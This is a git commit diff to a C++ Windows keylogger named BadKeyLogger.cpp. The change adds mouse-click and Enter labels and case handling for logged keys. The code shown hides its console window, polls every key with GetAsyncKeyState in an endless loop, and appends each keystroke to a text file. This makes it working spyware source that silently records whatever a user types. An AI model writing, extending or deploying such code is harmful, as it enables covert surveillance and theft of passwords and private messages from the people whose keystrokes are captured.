7a601bc924c0534917ca5d212ed0dcfeadae3450
SouhibSaleh <143820318+SouhibSaleh@users.noreply.github.com>
2023-10-18 20:46:12 +0300

    Update BadKeyLogger.cpp

--- BadKeyLogger.cpp
+++ BadKeyLogger.cpp
@@ -7,22 +7,24 @@ std::string check(int a)
 {
 	switch (a)
 	{
-	case VK_CAPITAL: return "[captical]";
-	case VK_SHIFT: return "[shift]";
-	case VK_RETURN: return "\n";
+	case VK_CAPITAL: return " [captical] ";
+	case VK_SHIFT: return " [shift] ";
+	case VK_RETURN: return " [enter] ";
+	case VK_LBUTTON: return " [Lclick] ";
+	case VK_RBUTTON: return " [Rclick] ";
 	}
 	return "";
 }
 int main(){
 	   
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	std::string s;
+	std::string s,ss;
 	std::fstream op; 
-	
 	while (true)
 	{
 		for (int x = 1; x <= 190; x++)
 		{
+			   
 			if (GetAsyncKeyState(x) == -32767)
 			{
 				op.open("testing.txt", std::ios_base::app);
@@ -31,8 +33,12 @@ int main(){
 				if (check(x).size()) {
 					op << s;
 				}
-				else  op << (char)x;
-				
+				else {
+					if (GetAsyncKeyState(VK_SHIFT))
+						op << (char)x;
+					else
+					op << (char)tolower((char)x);
+				}
 				op.close();
 			}
 		}
